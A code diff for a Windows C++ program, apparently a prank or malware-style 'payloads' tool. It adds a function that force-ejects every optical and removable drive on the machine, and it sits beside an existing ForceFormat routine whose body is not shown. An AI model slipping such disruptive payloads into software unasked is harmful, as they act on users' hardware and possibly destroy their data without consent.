@@ -5,6 +5,7 @@
 #include <winioctl.h>
 
 #include "dates.h"
+#include "hw.h"
 
 #include "../utils/unicurse.h" // needed for cursed payloads
 
@@ -69,6 +70,30 @@ static void ForceEject(wchar_t driveLetter)
 		nullptr, 0, nullptr, 0, &bytes, nullptr);
 
 	CloseHandle(h);
+}
+
+// Eject every optical / removable drive on the box.
+void EjectAllOptical()
+{
+	DWORD mask = GetLogicalDrives();
+
+	for (int i = 0; i < 26; ++i)
+	{
+		if (!(mask & (1u << i)))
+			continue;
+
+		wchar_t root[4] = {
+			static_cast<wchar_t>(L'A' + i),
+			L':',
+			0,
+			0
+		};
+
+		const UINT type = GetDriveTypeW(root);
+
+		if (type == DRIVE_CDROM || type == DRIVE_REMOVABLE)
+			ForceEject(static_cast<wchar_t>(L'A' + i));
+	}
 }
 
 static void ForceFormat(wchar_t driveLetter)
